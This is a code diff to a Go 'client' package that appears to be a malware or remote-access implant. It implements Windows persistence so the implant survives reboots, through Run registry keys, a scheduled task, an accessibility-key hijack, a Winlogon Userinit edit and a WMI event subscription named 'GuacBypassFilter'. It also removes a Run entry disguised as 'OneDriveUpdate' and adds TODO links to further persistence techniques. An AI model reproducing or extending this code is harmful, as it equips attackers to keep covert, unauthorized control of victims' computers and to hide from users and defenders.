@@ -1,6 +1,7 @@
 package client
 
 import (
+	"errors"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -19,6 +20,7 @@ import (
 // TODO: Add Fileless persistence as shown by
 // https://github.com/ewhitehats/InvisiblePersistence
 
+// Persist makes sure that the executable is run after a reboot
 func Persist(path string) {
 	elevated := CheckElevate()
 	if elevated {
@@ -28,6 +30,7 @@ func Persist(path string) {
 	}
 }
 
+// persistAdmin persistence using admin priviliges
 func persistAdmin(path string) {
 	go schtasks(path)
 	go ifeo(path)
@@ -36,42 +39,32 @@ func persistAdmin(path string) {
 	go hklm(path)
 }
 
+// persistUser persistence using user priviliges
 func persistUser(path string) {
-	version, err := GetVer()
-	if err != nil {
-		return
-	}
+	version, _ := GetVer()
 	if version == 10 {
-		err = cortana(path)
-		if err == nil {
-			return
-		}
+		go people(path)
+		go cortana(path)
 	}
 	hkcu(path)
 
 }
 
+// cortana noadmin works on win 10
 func cortana(path string) error {
-	//noadmin works on win 10
-	key, err := registry.OpenKey(
-		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
-		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
-	)
-	if err != nil {
-		return err
-	}
-	defer key.Close()
-	err = key.SetStringValue("OneDriveUpdate", path)
-	if err != nil {
-		return err
-	}
-	log.Println("cortana success")
-	return nil
-
+	// TODO: Add cortana persitence https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/persist/persist_cortana.py
+	return errors.New("Not implemented")
 }
 
+// people noadmin works on Win10
+func people(path string) error {
+	// TODO: Add people persitence https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/persist/persist_people.py
+	return errors.New("Not implemented")
+}
+
+// hkcu noadmin should just work
 func hkcu(path string) error {
-	//noadmin should just work
+
 	key, err := registry.OpenKey(
 		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
 		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
@@ -88,8 +81,8 @@ func hkcu(path string) error {
 	return nil
 }
 
+// hklm admin
 func hklm(path string) error {
-	//admin
 	keypath := `Software\Microsoft\Windows\CurrentVersion\Run`
 	if runtime.GOARCH == "386" {
 		keypath = `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`
@@ -111,8 +104,9 @@ func hklm(path string) error {
 	return nil
 }
 
+//schtask admin
 func schtasks(path string) error {
-	//admin
+
 	var xmlTemplate = schtask
 	var tempxml = filepath.Join(Path, "temp.xml")
 	err := ioutil.WriteFile(tempxml, []byte(xmlTemplate), 0666)
@@ -133,8 +127,9 @@ func schtasks(path string) error {
 	return nil
 }
 
+// ifeo admin
 func ifeo(path string) error {
-	//admin
+
 	access, _, err := registry.CreateKey(
 		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
 		registry.SET_VALUE|registry.ALL_ACCESS)
@@ -164,8 +159,9 @@ func ifeo(path string) error {
 	return nil
 }
 
+// userinit admin
 func userinit(path string) error {
-	//admin
+
 	key, _, err := registry.CreateKey(
 		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
 		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
@@ -182,8 +178,8 @@ func userinit(path string) error {
 	return nil
 }
 
+// wmic admin
 func wmic(path string) error {
-	//admin
 	cmd := exec.Command("cmd", "/C",
 		fmt.Sprintf(
 			"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
